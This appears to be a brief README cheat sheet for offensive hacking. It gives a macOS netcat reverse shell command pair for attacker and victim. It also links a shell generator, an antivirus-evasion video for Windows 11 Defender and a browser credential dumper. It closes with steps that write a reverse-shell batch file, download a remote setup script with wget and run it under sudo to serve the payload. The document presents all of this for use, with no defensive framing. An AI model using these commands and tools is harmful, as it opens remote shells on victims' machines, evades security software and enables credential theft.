# ShellCode

### Shell Generator Resource(Reverse, Bind, HoaxShell, MSFVenom)
[Shell Generator](https://www.revshells.com) 


**MAC OS Reverse Shell Example:** (Last tested 11/24)

- Attacker: nc -lvnp &lt;Port&gt;

- Victim: nc &lt;IP&gt; &lt;Port&gt; -e /bin/bash

**Windwos 11 Reverse Shell Example:**

- cat & mouse game to bypass Microsoft Defender
- Useful resource: [Youtube](https://www.youtube.com/watch?v=SYM4i474JqM)


---
### Browser Extensions
[Hack-Tools Chrome Extension](https://chromewebstore.google.com/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi)

---
### Dump Web-Browser Creds
[git](https://github.com/moonD4rk/HackBrowserData.git) (Last tested 11/24)

---
### Spin up a local Web Server to distribute the files(Last tested 11/24)
To set up a web server and host your script, follow these steps:

   ```bash
   touch powershellreverse.bat
   echo "<ShellCode here>" > powershellreverse.bat
   wget https://github.com/NickolayMOmelchenko/ShellCode/raw/refs/heads/main/setup_windows_website.sh
   chmod +x setup_windows_website.sh
   sudo ./setup_windows_website.sh

